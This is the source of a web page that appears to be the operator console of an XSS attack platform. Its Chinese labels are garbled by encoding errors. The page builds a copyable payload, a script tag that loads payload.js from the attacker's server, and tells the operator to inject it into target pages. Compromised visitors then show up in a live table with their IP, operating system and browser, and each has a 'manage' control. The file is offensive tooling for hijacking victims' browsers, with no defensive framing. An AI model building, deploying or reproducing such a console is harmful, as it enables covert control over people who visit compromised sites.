<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS ÁÆ°ÁêÜÂπ≥Âè∞</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            min-height: 100vh;
            color: #333;
        }

        .header {
            background: white;
            padding: 1rem 2rem;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .header-content {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo {
            font-size: 1.5rem;
            font-weight: 700;
            color: #4a6cf7;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .logo::before {
            content: "üõ°Ô∏è";
            font-size: 1.2rem;
        }

        .header-actions {
            display: flex;
            gap: 1rem;
            align-items: center;
        }

        .stats {
            display: flex;
            gap: 1.5rem;
            font-size: 0.9rem;
            color: #666;
        }

        .stat-item {
            display: flex;
            align-items: center;
            gap: 0.3rem;
        }

        .stat-value {
            font-weight: 600;
            color: #4a6cf7;
        }

        .btn {
            padding: 0.5rem 1rem;
            border: none;
            border-radius: 6px;
            font-size: 0.9rem;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s ease;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
        }

        .btn-primary {
            background: #4a6cf7;
            color: white;
        }

        .btn-primary:hover {
            background: #3a5ce5;
            transform: translateY(-1px);
        }

        .btn-secondary {
            background: #f0f2f5;
            color: #4a6cf7;
            border: 1px solid #e0e4e8;
        }

        .btn-secondary:hover {
            background: #e0e4e8;
        }

        .btn-danger {
            background: #ff6b6b;
            color: white;
        }

        .btn-danger:hover {
            background: #ff5252;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 2rem;
        }

        .section {
            background: white;
            border-radius: 10px;
            padding: 2rem;
            margin-bottom: 2rem;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
        }

        .section-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1.5rem;
            padding-bottom: 1rem;
            border-bottom: 1px solid #f0f0f0;
        }

        .section-title {
            font-size: 1.3rem;
            font-weight: 600;
            color: #333;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .payload-section {
            background: linear-gradient(135deg, #4a6cf7 0%, #3a5ce5 100%);
            color: white;
        }

        .payload-section .section-title {
            color: white;
        }

        .payload-code {
            background: rgba(255, 255, 255, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 6px;
            padding: 1rem;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            word-break: break-all;
            margin: 1rem 0;
            color: #fff;
        }

        /* ÂÆ¢Êà∑Á´ØË°®Ê†ºÊ†∑Âºè */
        .clients-table {
            width: 100%;
            border-collapse: collapse;
            background: white;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
        }

        .clients-table th {
            background: #f8f9fa;
            padding: 1rem;
            text-align: center;
            font-weight: 600;
            color: #333;
            border-bottom: 1px solid #e0e4e8;
            cursor: pointer;
            transition: all 0.2s ease;
            position: relative;
        }

        .clients-table th:hover {
            background: #f0f2f5;
        }

        .clients-table th.sorted-asc::after {
            content: "‚ñ≤";
            position: absolute;
            right: 10px;
            color: #4a6cf7;
        }

        .clients-table th.sorted-desc::after {
            content: "‚ñº";
            position: absolute;
            right: 10px;
            color: #4a6cf7;
        }

        .clients-table td {
            padding: 1rem;
            border-bottom: 1px solid #f0f0f0;
            vertical-align: middle;
        }

        .clients-table tr:last-child td {
            border-bottom: none;
        }

        .clients-table tr:hover {
            background: #f9f9f9;
        }

        .client-id {
            font-family: 'Courier New', monospace;
            font-weight: 600;
            color: #4a6cf7;
            min-width: 180px;
        }

        .client-detail {
            display: flex;
            flex-direction: column;
        }

        .detail-label {
            font-size: 0.8rem;
            color: #888;
            display: none; /* ÈöêËóèÊ†áÁ≠æÔºåÂõ†‰∏∫Â∑≤ÁªèÊúâË°®Â§¥ */
        }

        .detail-value {
            font-size: 0.9rem;
        }

        .client-actions {
            display: flex;
            gap: 0.5rem;
            justify-content: flex-end;
        }

        .client-status {
            padding: 0.3rem 0.8rem;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .status-online {
            background: #e6f7e6;
            color: #28a745;
            border: 1px solid #c3e6cb;
        }

        .client-actions {
            display: flex;
            gap: 0.5rem;
        }

        .empty-state {
            text-align: center;
            padding: 3rem 1rem;
            color: #888;
            background: #f9f9f9;
            border-radius: 8px;
            border: 1px dashed #e0e4e8;
        }

        .empty-state-icon {
            font-size: 3rem;
            margin-bottom: 1rem;
            opacity: 0.5;
        }

        .empty-state-text {
            font-size: 1.1rem;
            margin-bottom: 0.5rem;
        }

        .empty-state-subtext {
            font-size: 0.9rem;
            opacity: 0.7;
        }

        .refresh-indicator {
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            font-size: 0.8rem;
            color: #666;
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        .refresh-indicator.show {
            opacity: 1;
        }

        @keyframes spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        .spinning {
            animation: spin 1s linear infinite;
        }

        @media (max-width: 768px) {
            .container {
                padding: 1rem;
            }
            
            .header-content {
                flex-direction: column;
                gap: 1rem;
            }
            
            .stats {
                flex-wrap: wrap;
                justify-content: center;
            }
            
            .client-info {
                flex-direction: column;
                align-items: flex-start;
                gap: 0.5rem;
            }
            
            .client-details {
                flex-direction: column;
                gap: 0.5rem;
            }
            
            .client-row {
                flex-direction: column;
                align-items: flex-start;
                gap: 1rem;
            }
            
            .client-actions {
                width: 100%;
            }
            
            .client-actions button {
                flex: 1;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="header-content">
            <div class="logo">XSS ÁÆ°ÁêÜÂπ≥Âè∞</div>
            <div class="header-actions">
                <div class="stats">
                    <div class="stat-item">
                        <span>Âú®Á∫øÂÆ¢Êà∑Á´Ø</span>
                        <span class="stat-value" id="clientCount">0</span>
                    </div>
                    <div class="stat-item">
                        <span>ËøêË°åÊó∂Èó¥</span>
                        <span class="stat-value" id="uptime">--</span>
                    </div>
                </div>
                <div class="refresh-indicator" id="refreshIndicator">
                    <span>üîÑ</span>
                    <span>Êõ¥Êñ∞‰∏≠...</span>
                </div>
                <button class="btn btn-secondary" onclick="refreshClients()">
                    <span>üîÑ</span>
                    Âà∑Êñ∞
                </button>
            </div>
        </div>
    </div>

    <div class="container">
        <div class="section payload-section">
            <div class="section-header">
                <h2 class="section-title">
                    <span>‚ö°</span>
                    Payload ‰ª£Á†Å
                </h2>
                <button class="btn btn-secondary" onclick="copyPayload()">
                    <span>üìã</span>
                    Â§çÂà∂‰ª£Á†Å
                </button>
            </div>
            <div class="payload-code" id="payloadCode">
                <!-- Â∞ÜÁî±JavaScriptÂä®ÊÄÅÂ°´ÂÖÖ -->
            </div>
            <p style="opacity: 0.9; font-size: 0.9rem; margin-top: 1rem;">
                Â∞Ü‰∏äËø∞‰ª£Á†ÅÊ≥®ÂÖ•Âà∞ÁõÆÊ†áÈ°µÈù¢Âç≥ÂèØÂª∫Á´ãËøûÊé•„ÄÇÂÆ¢Êà∑Á´ØÂ∞ÜËá™Âä®ËøûÊé•Âà∞ÊéßÂà∂Âè∞„ÄÇ
            </p>
        </div>

        <div class="section">
            <div class="section-header">
                <h2 class="section-title">
                    <span>üë•</span>
                    Âú®Á∫øÂÆ¢Êà∑Á´Ø
                </h2>
                <div style="display: flex; gap: 1rem; align-items: center;">
                    <span style="font-size: 0.9rem; color: #666;">Ëá™Âä®Âà∑Êñ∞: 2Áßí</span>
                </div>
            </div>
            <div id="clientsList">
                <table class="clients-table" id="clientsTable" style="display: none;">
                    <thead>
                        <tr>
                            <th data-sort="id">ÂÆ¢Êà∑Á´ØID</th>
                            <th data-sort="ip">IPÂú∞ÂùÄ</th>
                            <th data-sort="onlineAt">‰∏äÁ∫øÊó∂Èó¥</th>
                            <th data-sort="lastSeen">ÊúÄÂêéÊ¥ªË∑É</th>
                            <th data-sort="os">Êìç‰ΩúÁ≥ªÁªü</th>
                            <th data-sort="browser">ÊµèËßàÂô®</th>
                            <th data-sort="status">Áä∂ÊÄÅ</th>
                            <th>Êìç‰Ωú</th>
                        </tr>
                    </thead>
                    <tbody>
                        <!-- ÂÆ¢Êà∑Á´ØË°åÂ∞ÜÂä®ÊÄÅÁîüÊàê -->
                    </tbody>
                </table>
                <div class="empty-state" id="emptyState">
                    <div class="empty-state-icon">üîç</div>
                    <div class="empty-state-text">ÊöÇÊó†Âú®Á∫øÂÆ¢Êà∑Á´Ø</div>
                    <div class="empty-state-subtext">Á≠âÂæÖÂÆ¢Êà∑Á´ØËøûÊé•...</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let startTime = Date.now();

        // Êõ¥Êñ∞ËøêË°åÊó∂Èó¥
        function updateUptime() {
            const now = Date.now();
            const diff = Math.floor((now - startTime) / 1000);
            const hours = Math.floor(diff / 3600);
            const minutes = Math.floor((diff % 3600) / 60);
            const seconds = diff % 60;
            
            let uptime = '';
            if (hours > 0) uptime += hours + 'Êó∂';
            if (minutes > 0) uptime += minutes + 'ÂàÜ';
            uptime += seconds + 'Áßí';
            
            document.getElementById('uptime').textContent = uptime;
        }

        // Ëé∑ÂèñÊúçÂä°Âô®ÈÖçÁΩÆÂπ∂ËÆæÁΩÆ Payload
        let serverBaseUrl = '';
        
        function getServerConfig() {
            // ‰ªéÂΩìÂâçURLËé∑ÂèñÂü∫Á°ÄURL
            const protocol = window.location.protocol;
            const host = window.location.host;
            serverBaseUrl = `${protocol}//${host}`;
            
            // ËÆæÁΩÆ Payload ‰ª£Á†Å
            updatePayloadCode();
        }
        
        function updatePayloadCode() {
            const payloadCode = `<script src="${serverBaseUrl}/payload.js"><\/script>`;
            document.getElementById('payloadCode').innerHTML = payloadCode;
        }
        
        // Â§çÂà∂ Payload
        function copyPayload() {
            const payloadText = `<script src="${serverBaseUrl}/payload.js"><\/script>`;
            navigator.clipboard.writeText(payloadText).then(() => {
                const btn = event.target.closest('button');
                const originalText = btn.innerHTML;
                btn.innerHTML = '<span>‚úÖ</span>Â∑≤Â§çÂà∂';
                setTimeout(() => {
                    btn.innerHTML = originalText;
                }, 2000);
            });
        }

        // Âà∑Êñ∞ÂÆ¢Êà∑Á´ØÂàóË°®
        async function refreshClients() {
            const indicator = document.getElementById('refreshIndicator');
            indicator.classList.add('show');
            indicator.querySelector('span').classList.add('spinning');
            
            try {
                await loadClients();
            } finally {
                setTimeout(() => {
                    indicator.classList.remove('show');
                    indicator.querySelector('span').classList.remove('spinning');
                }, 500);
            }
        }

        // ÂÖ®Â±ÄÂèòÈáè
        let clients = [];
        let currentSort = { column: 'lastSeen', direction: 'desc' };
        
        // Ëß£ÊûêÁî®Êà∑‰ª£ÁêÜÂ≠óÁ¨¶‰∏≤ÔºåÊèêÂèñÊìç‰ΩúÁ≥ªÁªüÂíåÊµèËßàÂô®‰ø°ÊÅØ
        function parseUserAgent(userAgent) {
            if (!userAgent) return { os: 'Êú™Áü•', browser: 'Êú™Áü•' };
            
            // Êìç‰ΩúÁ≥ªÁªüÊ£ÄÊµã
            let os = 'Êú™Áü•';
            if (userAgent.indexOf('Windows NT 10.0') !== -1) os = 'Windows 10';
            else if (userAgent.indexOf('Windows NT 6.3') !== -1) os = 'Windows 8.1';
            else if (userAgent.indexOf('Windows NT 6.2') !== -1) os = 'Windows 8';
            else if (userAgent.indexOf('Windows NT 6.1') !== -1) os = 'Windows 7';
            else if (userAgent.indexOf('Windows NT 6.0') !== -1) os = 'Windows Vista';
            else if (userAgent.indexOf('Windows NT 5.1') !== -1) os = 'Windows XP';
            else if (userAgent.indexOf('Windows NT') !== -1) os = 'Windows NT';
            else if (userAgent.indexOf('Mac OS X') !== -1) {
                const macOSVersion = userAgent.match(/Mac OS X ([0-9_]+)/);
                if (macOSVersion && macOSVersion[1]) {
                    const version = macOSVersion[1].replace(/_/g, '.');
                    os = 'macOS ' + version;
                } else {
                    os = 'macOS';
                }
            }
            else if (userAgent.indexOf('iPhone') !== -1) os = 'iOS';
            else if (userAgent.indexOf('iPad') !== -1) os = 'iPadOS';
            else if (userAgent.indexOf('Android') !== -1) {
                const androidVersion = userAgent.match(/Android ([0-9\.]+)/);
                if (androidVersion && androidVersion[1]) {
                    os = 'Android ' + androidVersion[1];
                } else {
                    os = 'Android';
                }
            }
            else if (userAgent.indexOf('Linux') !== -1) os = 'Linux';
            else if (userAgent.indexOf('CentOS') !== -1) os = 'CentOS';
            else if (userAgent.indexOf('Ubuntu') !== -1) os = 'Ubuntu';
            
            // ÊµèËßàÂô®Ê£ÄÊµã - ‰∏≠ÂõΩÁâπËâ≤ÊµèËßàÂô®‰ºòÂÖàÊ£ÄÊµã
            let browser = 'Êú™Áü•';
            
            // ÊêúÁãóÊµèËßàÂô®
            if (userAgent.indexOf('SE') !== -1 && userAgent.indexOf('MetaSr') !== -1) {
                browser = 'ÊêúÁãóÊµèËßàÂô®';
            }
            // QQÊµèËßàÂô®
            else if (userAgent.indexOf('QQBrowser') !== -1) {
                const qqVersion = userAgent.match(/QQBrowser\/([0-9\.]+)/);
                if (qqVersion && qqVersion[1]) {
                    browser = 'QQÊµèËßàÂô® ' + qqVersion[1];
                } else {
                    browser = 'QQÊµèËßàÂô®';
                }
            }
            // ÂæÆ‰ø°ÂÜÖÁΩÆÊµèËßàÂô®
            else if (userAgent.indexOf('MicroMessenger') !== -1) {
                const wxVersion = userAgent.match(/MicroMessenger\/([0-9\.]+)/);
                if (wxVersion && wxVersion[1]) {
                    browser = 'ÂæÆ‰ø° ' + wxVersion[1];
                } else {
                    browser = 'ÂæÆ‰ø°';
                }
            }
            // UCÊµèËßàÂô®
            else if (userAgent.indexOf('UCBrowser') !== -1) {
                const ucVersion = userAgent.match(/UCBrowser\/([0-9\.]+)/);
                if (ucVersion && ucVersion[1]) {
                    browser = 'UCÊµèËßàÂô® ' + ucVersion[1];
                } else {
                    browser = 'UCÊµèËßàÂô®';
                }
            }
            // ÁôæÂ∫¶ÊµèËßàÂô®
            else if (userAgent.indexOf('Baidu') !== -1 || userAgent.indexOf('BIDUBrowser') !== -1) {
                browser = 'ÁôæÂ∫¶ÊµèËßàÂô®';
            }
            // 360ÊµèËßàÂô®
            else if (userAgent.indexOf('360EE') !== -1 || userAgent.indexOf('360SE') !== -1) {
                browser = '360ÊµèËßàÂô®';
            }
            // ÁåéË±πÊµèËßàÂô®
            else if (userAgent.indexOf('LBBROWSER') !== -1) {
                browser = 'ÁåéË±πÊµèËßàÂô®';
            }
            // Âçé‰∏∫ÊµèËßàÂô®
            else if (userAgent.indexOf('HuaweiBrowser') !== -1) {
                browser = 'Âçé‰∏∫ÊµèËßàÂô®';
            }
            // OPPOÊµèËßàÂô®
            else if (userAgent.indexOf('HeyTapBrowser') !== -1) {
                browser = 'OPPOÊµèËßàÂô®';
            }
            // vivoÊµèËßàÂô®
            else if (userAgent.indexOf('VivoBrowser') !== -1) {
                browser = 'vivoÊµèËßàÂô®';
            }
            // Â∞èÁ±≥ÊµèËßàÂô®
            else if (userAgent.indexOf('MiuiBrowser') !== -1) {
                browser = 'Â∞èÁ±≥ÊµèËßàÂô®';
            }
            // Â§∏ÂÖãÊµèËßàÂô®
            else if (userAgent.indexOf('Quark') !== -1) {
                browser = 'Â§∏ÂÖãÊµèËßàÂô®';
            }
            // ÂõΩÈôÖÊµèËßàÂô®
            else if (userAgent.indexOf('Edge') !== -1 || userAgent.indexOf('Edg/') !== -1) {
                const edgeVersion = userAgent.match(/Edg\/([0-9\.]+)/);
                if (edgeVersion && edgeVersion[1]) {
                    browser = 'Edge ' + edgeVersion[1];
                } else {
                    browser = 'Edge';
                }
            }
            else if (userAgent.indexOf('Chrome') !== -1) {
                const chromeVersion = userAgent.match(/Chrome\/([0-9\.]+)/);
                if (chromeVersion && chromeVersion[1]) {
                    browser = 'Chrome ' + chromeVersion[1];
                } else {
                    browser = 'Chrome';
                }
            }
            else if (userAgent.indexOf('Safari') !== -1 && userAgent.indexOf('Chrome') === -1) {
                const safariVersion = userAgent.match(/Safari\/([0-9\.]+)/);
                if (safariVersion && safariVersion[1]) {
                    browser = 'Safari ' + safariVersion[1];
                } else {
                    browser = 'Safari';
                }
            }
            else if (userAgent.indexOf('Firefox') !== -1) {
                const firefoxVersion = userAgent.match(/Firefox\/([0-9\.]+)/);
                if (firefoxVersion && firefoxVersion[1]) {
                    browser = 'Firefox ' + firefoxVersion[1];
                } else {
                    browser = 'Firefox';
                }
            }
            else if (userAgent.indexOf('MSIE') !== -1 || userAgent.indexOf('Trident/') !== -1) {
                const ieVersion = userAgent.match(/MSIE ([0-9\.]+)/);
                if (ieVersion && ieVersion[1]) {
                    browser = 'IE ' + ieVersion[1];
                } else {
                    browser = 'IE';
                }
            }
            
            return { os, browser };
        }

        // Âä†ËΩΩÂÆ¢Êà∑Á´ØÂàóË°®
        async function loadClients() {
            try {
                const response = await fetch('/api/clients');
                if (!response.ok) throw new Error('Network response was not ok');
                
                clients = await response.json();
                const countElement = document.getElementById('clientCount');
                const clientsTable = document.getElementById('clientsTable');
                const emptyState = document.getElementById('emptyState');
                
                countElement.textContent = clients.length;
                
                if (clients.length === 0) {
                    clientsTable.style.display = 'none';
                    emptyState.style.display = 'block';
                    return;
                }

                // ÊòæÁ§∫Ë°®Ê†ºÔºåÈöêËóèÁ©∫Áä∂ÊÄÅ
                clientsTable.style.display = 'table';
                emptyState.style.display = 'none';

                // ÊéíÂ∫èÂÆ¢Êà∑Á´Ø
                sortClients(currentSort.column, currentSort.direction);
                
            } catch (error) {
                console.error('Failed to load clients:', error);
                const clientsTable = document.getElementById('clientsTable');
                const emptyState = document.getElementById('emptyState');
                
                clientsTable.style.display = 'none';
                emptyState.style.display = 'block';
                emptyState.innerHTML = '<div class="empty-state-icon">üîç</div>' +
                    '<div class="empty-state-text">ÊöÇÊó†‰ºöËØù</div>' +
                    '<div class="empty-state-subtext">Á≠âÂæÖÂÆ¢Êà∑Á´ØËøûÊé•...</div>';
            }
        }

        // ÊéíÂ∫èÂÆ¢Êà∑Á´Ø
        function sortClients(column, direction) {
            // ‰øùÂ≠òÂΩìÂâçÊéíÂ∫èÁä∂ÊÄÅ
            currentSort.column = column;
            currentSort.direction = direction;
            
            // Êõ¥Êñ∞Ë°®Â§¥Ê†∑Âºè
            const headers = document.querySelectorAll('#clientsTable th');
            headers.forEach(header => {
                header.classList.remove('sorted-asc', 'sorted-desc');
                if (header.getAttribute('data-sort') === column) {
                    header.classList.add(direction === 'asc' ? 'sorted-asc' : 'sorted-desc');
                }
            });
            
            // ÊéíÂ∫èÂÆ¢Êà∑Á´ØÊï∞ÁªÑ
            clients.sort((a, b) => {
                let valueA, valueB;
                
                switch (column) {
                    case 'id':
                        valueA = a.id;
                        valueB = b.id;
                        break;
                    case 'ip':
                        valueA = a.ip;
                        valueB = b.ip;
                        break;
                    case 'onlineAt':
                        valueA = new Date(a.onlineAt).getTime();
                        valueB = new Date(b.onlineAt).getTime();
                        break;
                    case 'lastSeen':
                        valueA = new Date(a.lastSeen).getTime();
                        valueB = new Date(b.lastSeen).getTime();
                        break;
                    case 'os':
                        valueA = parseUserAgent(a.userAgent).os;
                        valueB = parseUserAgent(b.userAgent).os;
                        break;
                    case 'browser':
                        valueA = parseUserAgent(a.userAgent).browser;
                        valueB = parseUserAgent(b.userAgent).browser;
                        break;
                    default:
                        valueA = a.id;
                        valueB = b.id;
                }
                
                if (direction === 'asc') {
                    return valueA > valueB ? 1 : -1;
                } else {
                    return valueA < valueB ? 1 : -1;
                }
            });
            
            // Ê∏≤ÊüìÊéíÂ∫èÂêéÁöÑÂÆ¢Êà∑Á´Ø
            renderClients();
        }

        // ÁÆÄÂåñÂÆ¢Êà∑Á´ØIDÊòæÁ§∫
        function simplifyClientId(id) {
            // Â¶ÇÊûúIDÊ†ºÂºè‰∏∫ client_timestampÔºåÂàôÊèêÂèñÂêé6‰ΩçÊï∞Â≠ó
            if (id && id.startsWith('client_')) {
                const numPart = id.substring(7); // ÂéªÊéâ "client_" ÂâçÁºÄ
                if (numPart.length > 6) {
                    return 'ÂÆ¢Êà∑Á´Ø_' + numPart.substring(numPart.length - 6);
                }
            }
            return id;
        }

        // Ê∏≤ÊüìÂÆ¢Êà∑Á´ØË°®Ê†º
        function renderClients() {
            const tbody = document.querySelector('#clientsTable tbody');
            
            tbody.innerHTML = clients.map(client => {
                // ‰ºòÂÖàÊòæÁ§∫ÂÖ¨ÁΩëIP
                const ipAddress = client.publicIP || client.ip || 'Êú™Áü•';
                
                // Ëß£ÊûêÁî®Êà∑‰ª£ÁêÜ
                const { os, browser } = parseUserAgent(client.userAgent);
                
                // ÁÆÄÂåñÂÆ¢Êà∑Á´ØIDÊòæÁ§∫
                const simplifiedId = simplifyClientId(client.id);
                
                return `<tr>
                    <td class="client-id" title="${client.id}">${simplifiedId}</td>
                    <td>${ipAddress}</td>
                    <td>${new Date(client.onlineAt).toLocaleString()}</td>
                    <td>${new Date(client.lastSeen).toLocaleString()}</td>
                    <td title="${os}">${os}</td>
                    <td title="${browser}">${browser}</td>
                    <td><div class="client-status status-online">Âú®Á∫ø</div></td>
                    <td>
                        <div class="client-actions">
                            <button class="btn btn-primary" onclick="openClient('${client.id}')">
                                <span>‚öôÔ∏è</span>ÁÆ°ÁêÜ
                            </button>
                            <button class="btn btn-danger" onclick="disconnectClient('${client.id}')" title="Êñ≠ÂºÄËøûÊé•">
                                <span>‚ùå</span>Êñ≠ÂºÄ
                            </button>
                        </div>
                    </td>
                </tr>`;
            }).join('');
        }

        // ÊâìÂºÄÂÆ¢Êà∑Á´ØÁÆ°ÁêÜÈ°µÈù¢
        function openClient(clientId) {
            window.open('/client/' + clientId, '_blank');
        }

        // Êñ≠ÂºÄÂÆ¢Êà∑Á´ØËøûÊé•
        async function disconnectClient(clientId) {
            if (!confirm('Á°ÆÂÆöË¶ÅÊñ≠ÂºÄÊ≠§ÂÆ¢Êà∑Á´ØËøûÊé•ÂêóÔºü')) return;
            
            try {
                const disconnectResponse = await fetch('/api/client/' + clientId + '/disconnect', {
                    method: 'POST'
                });
                
                if (disconnectResponse.ok) {
                    await loadClients();
                } else {
                    alert('Êñ≠ÂºÄËøûÊé•Â§±Ë¥•');
                }
            } catch (error) {
                alert('Êìç‰ΩúÂ§±Ë¥•: ' + error.message);
            }
        }

        // ÂàùÂßãÂåñ
        document.addEventListener('DOMContentLoaded', () => {
            // Ëé∑ÂèñÊúçÂä°Âô®ÈÖçÁΩÆ
            getServerConfig();
            
            // Ê∑ªÂä†Ë°®Â§¥ÊéíÂ∫è‰∫ã‰ª∂
            const headers = document.querySelectorAll('#clientsTable th[data-sort]');
            headers.forEach(header => {
                header.addEventListener('click', () => {
                    const column = header.getAttribute('data-sort');
                    // Â¶ÇÊûúÁÇπÂáªÂΩìÂâçÊéíÂ∫èÂàóÔºåÂàôÂàáÊç¢ÊéíÂ∫èÊñπÂêë
                    const direction = (column === currentSort.column && currentSort.direction === 'asc') ? 'desc' : 'asc';
                    sortClients(column, direction);
                });
            });
            
            loadClients();
            setInterval(loadClients, 2000); // ÊØè2ÁßíÂà∑Êñ∞
            setInterval(updateUptime, 1000); // ÊØèÁßíÊõ¥Êñ∞ËøêË°åÊó∂Èó¥
            updateUptime();
        });
    </script>
</body>
</html>